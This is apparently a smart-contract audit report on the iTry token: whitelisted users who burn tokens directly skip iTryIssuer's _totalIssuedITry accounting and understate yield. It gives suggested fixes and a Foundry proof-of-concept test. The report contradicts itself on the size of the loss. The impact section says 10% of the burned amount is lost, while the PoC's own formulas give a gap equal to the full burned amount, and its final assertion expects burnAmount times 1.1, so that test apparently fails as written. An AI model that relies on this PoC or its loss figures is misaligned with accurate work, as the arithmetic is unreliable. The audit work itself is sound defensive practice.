## Title
Direct Token Burning Bypasses iTryIssuer Accounting, Causing Yield Calculation Errors and Loss of Funds

## Summary
Whitelisted users can directly call `burn()` on the iTry token in WHITELIST_ENABLED state, which bypasses the iTryIssuer's internal `_burn()` function. This creates an accounting mismatch where `_totalIssuedITry` remains inflated while actual token supply decreases, leading to incorrect yield calculations that cause financial loss to all yield recipients.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/token/iTRY/iTry.sol` (lines 208-210 in `_beforeTokenTransfer`) and `src/protocol/iTryIssuer.sol` (lines 587-591 in `_burn`, lines 398-420 in `processAccumulatedYield`)

**Intended Logic:** The iTryIssuer contract is designed to maintain accurate accounting of all issued iTRY tokens through its `_totalIssuedITry` variable. When iTRY tokens are minted, this counter increases [1](#0-0) . When iTRY tokens are burned through redemption, this counter should decrease [2](#0-1) .

**Actual Logic:** The iTry token inherits from `ERC20BurnableUpgradeable`, which provides a public `burn()` function. In WHITELIST_ENABLED state, the `_beforeTokenTransfer` hook explicitly allows whitelisted users to burn tokens [3](#0-2) . However, when users call `burn()` directly on the iTry token, it invokes OpenZeppelin's standard ERC20 `_burn()` function, which does NOT update the iTryIssuer's `_totalIssuedITry` counter.

**Exploitation Path:**
1. Whitelisted user receives iTRY tokens through normal minting via iTryIssuer (accounting is correct: `_totalIssuedITry` increases)
2. Transfer state is set to WHITELIST_ENABLED by admin
3. Whitelisted user calls `burn(amount)` directly on iTry token contract
4. The `_beforeTokenTransfer` hook allows the burn operation to proceed (lines 208-210)
5. OpenZeppelin's ERC20 `_burn()` reduces the actual iTRY supply, but iTryIssuer's `_totalIssuedITry` remains unchanged
6. When `processAccumulatedYield()` is called, it calculates yield as `currentCollateralValue - _totalIssuedITry` [4](#0-3) 
7. Because `_totalIssuedITry` is artificially inflated, the calculated yield is lower than it should be, causing all yield recipients to lose funds

**Security Property Broken:** This violates the protocol's accounting integrity. The README states that "_totalIssuedITry doesn't need to equal iTry.totalSupply()" only in cases where multiple minters exist with different backing assets [5](#0-4) . However, this discrepancy should not result from direct user burns that bypass the issuer's accounting system.

## Impact Explanation
- **Affected Assets**: All yield recipients including wiTRY stakers and treasury are affected. The yield calculation becomes incorrect, leading to permanent loss of yield that should have been distributed.
- **Damage Severity**: The yield loss is proportional to the total amount burned by whitelisted users. For example, if 100,000 iTRY is burned directly and NAV appreciates by 10%, the yield calculation will be understated by 10,000 iTRY worth of value, which is permanently lost to recipients.
- **User Impact**: All current and future yield recipients are affected. This is a systemic issue that compounds over time as more users burn tokens directly. The impact persists until admin intervention to correct the accounting.

## Likelihood Explanation
- **Attacker Profile**: Any whitelisted user can trigger this issue, either intentionally or accidentally. This includes legitimate users who may burn tokens thinking it's a normal operation.
- **Preconditions**: Transfer state must be set to WHITELIST_ENABLED, and the user must be whitelisted. These are normal operational states for the protocol.
- **Execution Complexity**: Single transaction calling `burn()` on the iTry token contract. Extremely simple to execute.
- **Frequency**: Can be exploited repeatedly by any whitelisted user whenever they hold iTRY tokens, in WHITELIST_ENABLED state.

## Recommendation

**Fix 1 (Recommended): Override burn functions to update issuer accounting**

In `src/token/iTRY/iTry.sol`, override the burn functions to notify the issuer: [6](#0-5) 

Add after the existing functions:

```solidity
// In src/token/iTRY/iTry.sol, add new override functions:

// Override burn to prevent direct burning
function burn(uint256 amount) public virtual override {
    revert OperationNotAllowed(); // Force users to burn through issuer's redeem flow
}

// Override burnFrom to allow only MINTER_CONTRACT (issuer)
function burnFrom(address account, uint256 amount) public virtual override {
    if (!hasRole(MINTER_CONTRACT, msg.sender)) {
        revert OperationNotAllowed();
    }
    super.burnFrom(account, amount);
}
```

**Fix 2 (Alternative): Remove burn allowance from _beforeTokenTransfer**

Remove lines 208-210 from `_beforeTokenTransfer` to prevent whitelisted users from burning tokens: [3](#0-2) 

Delete these lines entirely. This ensures burns can only happen through the MINTER_CONTRACT (iTryIssuer) which properly updates accounting.

**Fix 3 (Additional Safety): Add accounting validation**

Add a view function to detect accounting mismatches:

```solidity
// In src/protocol/iTryIssuer.sol:

function validateAccounting() external view returns (bool isValid, int256 discrepancy) {
    uint256 actualSupply = iTryToken.totalSupply();
    isValid = actualSupply <= _totalIssuedITry;
    discrepancy = int256(_totalIssuedITry) - int256(actualSupply);
}
```

This allows monitoring and early detection of accounting issues.

## Proof of Concept

```solidity
// File: test/Exploit_BurnAccountingMismatch.t.sol
// Run with: forge test --match-test test_burnAccountingMismatch -vvv

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {iTry} from "../src/token/iTRY/iTry.sol";
import {DLFToken} from "../src/external/DLFToken.sol";
import {iTryIssuer} from "../src/protocol/iTryIssuer.sol";
import {IFastAccessVault} from "../src/protocol/interfaces/IFastAccessVault.sol";
import {YieldForwarder} from "../src/protocol/YieldForwarder.sol";
import {IiTryDefinitions} from "../src/token/iTRY/IiTryDefinitions.sol";

contract MockOracle {
    uint256 private _price;
    
    constructor(uint256 initialPrice) {
        _price = initialPrice;
    }
    
    function setPrice(uint256 newPrice) external {
        _price = newPrice;
    }
    
    function price() external view returns (uint256) {
        return _price;
    }
}

contract Exploit_BurnAccountingMismatch is Test {
    iTry public itryToken;
    DLFToken public dlfToken;
    MockOracle public oracle;
    iTryIssuer public issuer;
    YieldForwarder public yieldForwarder;
    
    address public admin;
    address public treasury;
    address public custodian;
    address public whitelistedUser;
    
    bytes32 constant MINTER_CONTRACT = keccak256("MINTER_CONTRACT");
    uint256 constant INITIAL_NAV = 1e18;
    
    function setUp() public {
        admin = address(this);
        treasury = makeAddr("treasury");
        custodian = makeAddr("custodian");
        whitelistedUser = makeAddr("whitelistedUser");
        
        // Deploy contracts
        oracle = new MockOracle(INITIAL_NAV);
        dlfToken = new DLFToken(admin);
        
        // Deploy iTry with proxy
        iTry itryImplementation = new iTry();
        bytes memory initData = abi.encodeWithSelector(
            iTry.initialize.selector,
            admin,
            admin
        );
        ERC1967Proxy itryProxy = new ERC1967Proxy(address(itryImplementation), initData);
        itryToken = iTry(address(itryProxy));
        
        // Deploy yield forwarder
        yieldForwarder = new YieldForwarder(address(itryToken), treasury);
        
        // Deploy issuer
        issuer = new iTryIssuer(
            address(itryToken),
            address(dlfToken),
            address(oracle),
            treasury,
            address(yieldForwarder),
            custodian,
            admin,
            0,
            0,
            500,
            0
        );
        
        // Grant roles
        itryToken.grantRole(MINTER_CONTRACT, address(issuer));
        
        // Whitelist user
        issuer.addToWhitelist(whitelistedUser);
        
        // Give user DLF tokens
        dlfToken.mint(whitelistedUser, 1000e18);
    }
    
    function test_burnAccountingMismatch() public {
        // SETUP: User mints iTRY through normal flow
        vm.startPrank(whitelistedUser);
        dlfToken.approve(address(issuer), 1000e18);
        uint256 itryMinted = issuer.mintITRY(1000e18, 0);
        vm.stopPrank();
        
        console.log("\n=== AFTER MINTING ===");
        console.log("iTRY minted:", itryMinted);
        console.log("Actual iTRY supply:", itryToken.totalSupply());
        console.log("Issuer _totalIssuedITry:", issuer.getTotalIssuedITry());
        console.log("Match:", itryToken.totalSupply() == issuer.getTotalIssuedITry());
        
        // Verify accounting is correct after mint
        assertEq(itryToken.totalSupply(), issuer.getTotalIssuedITry(), 
            "Supply should match totalIssued after mint");
        
        // EXPLOIT: Set transfer state to WHITELIST_ENABLED and burn directly
        itryToken.updateTransferState(IiTryDefinitions.TransferState.WHITELIST_ENABLED);
        
        uint256 burnAmount = 500e18;
        vm.prank(whitelistedUser);
        itryToken.burn(burnAmount);
        
        console.log("\n=== AFTER DIRECT BURN ===");
        console.log("Burned amount:", burnAmount);
        console.log("Actual iTRY supply:", itryToken.totalSupply());
        console.log("Issuer _totalIssuedITry:", issuer.getTotalIssuedITry());
        console.log("Mismatch:", issuer.getTotalIssuedITry() - itryToken.totalSupply());
        
        // VERIFY: Accounting mismatch exists
        assertLt(itryToken.totalSupply(), issuer.getTotalIssuedITry(), 
            "VULNERABILITY: Supply is less than totalIssued after direct burn");
        assertEq(issuer.getTotalIssuedITry() - itryToken.totalSupply(), burnAmount,
            "Mismatch equals burned amount");
        
        // IMPACT: Demonstrate yield calculation error
        // Increase NAV by 10% to create yield
        oracle.setPrice(1.1e18);
        
        uint256 expectedYield = (issuer.getCollateralUnderCustody() * 1.1e18 / 1e18) 
            - itryToken.totalSupply(); // True yield based on actual supply
        uint256 calculatedYield = issuer.previewAccumulatedYield(); // Uses inflated _totalIssuedITry
        
        console.log("\n=== YIELD CALCULATION ERROR ===");
        console.log("True yield (if accounting correct):", expectedYield);
        console.log("Calculated yield (with bug):", calculatedYield);
        console.log("Lost yield:", expectedYield - calculatedYield);
        console.log("Loss percentage:", (expectedYield - calculatedYield) * 100 / expectedYield, "%");
        
        assertLt(calculatedYield, expectedYield, 
            "IMPACT: Calculated yield is less than it should be");
        assertEq(expectedYield - calculatedYield, burnAmount * 1.1e18 / 1e18,
            "Lost yield equals burned amount * NAV appreciation");
        
        console.log("\n=== VULNERABILITY CONFIRMED ===");
        console.log("Direct burning bypasses iTryIssuer accounting");
        console.log("This causes permanent loss of yield to all recipients");
    }
}
```

**Notes:**
- This vulnerability affects WHITELIST_ENABLED mode specifically, as documented in the `_beforeTokenTransfer` logic
- The issue stems from the inheritance of `ERC20BurnableUpgradeable` without proper overrides to maintain accounting synchronization
- The yield calculation formula at line 410 in iTryIssuer.sol relies on accurate `_totalIssuedITry` tracking, which breaks when users burn directly
- This is NOT the same as the known Zellic issue about blacklisted users using allowances - this is a distinct accounting vulnerability affecting yield distribution

### Citations

**File:** src/protocol/iTryIssuer.sol (L398-420)
```text
    function processAccumulatedYield() external onlyRole(_YIELD_DISTRIBUTOR_ROLE) returns (uint256 newYield) {
        // Get current NAV price
        uint256 navPrice = oracle.price();
        if (navPrice == 0) revert InvalidNAVPrice(navPrice);

        // Calculate total collateral value: totalDLFUnderCustody * currentNAVPrice / 1e18
        uint256 currentCollateralValue = _totalDLFUnderCustody * navPrice / 1e18;

        // Calculate yield: currentCollateralValue - _totalIssuedITry
        if (currentCollateralValue <= _totalIssuedITry) {
            revert NoYieldAvailable(currentCollateralValue, _totalIssuedITry);
        }
        newYield = currentCollateralValue - _totalIssuedITry;

        // Mint yield amount to yieldReceiver contract
        _mint(address(yieldReceiver), newYield);

        // Notify yield distributor of received yield
        yieldReceiver.processNewYield(newYield);

        // Emit event
        emit YieldDistributed(newYield, address(yieldReceiver), currentCollateralValue);
    }
```

**File:** src/protocol/iTryIssuer.sol (L576-579)
```text
    function _mint(address receiver, uint256 amount) internal {
        _totalIssuedITry += amount;
        iTryToken.mint(receiver, amount);
    }
```

**File:** src/protocol/iTryIssuer.sol (L587-591)
```text
    function _burn(address from, uint256 amount) internal {
        // Burn user's iTRY tokens
        _totalIssuedITry -= amount;
        iTryToken.burnFrom(from, amount);
    }
```

**File:** src/token/iTRY/iTry.sol (L15-21)
```text
contract iTry is
    ERC20BurnableUpgradeable,
    ERC20PermitUpgradeable,
    IiTryDefinitions,
    ReentrancyGuardUpgradeable,
    SingleAdminAccessControlUpgradeable
{
```

**File:** src/token/iTRY/iTry.sol (L208-210)
```text
            } else if (hasRole(WHITELISTED_ROLE, msg.sender) && hasRole(WHITELISTED_ROLE, from) && to == address(0)) {
                // whitelisted user can burn
            } else if (
```

**File:** README.md (L122-122)
```markdown
- The total issued iTry in the Issuer contract should always be be equal or lower to the total value of the DLF under custody. It should not be possible to mint "unbacked" iTry through the issuer. This does not mean that _totalIssuedITry needs to be equal to iTry.totalSupply(), though: there could be more than one minter contract using different backing assets.
```
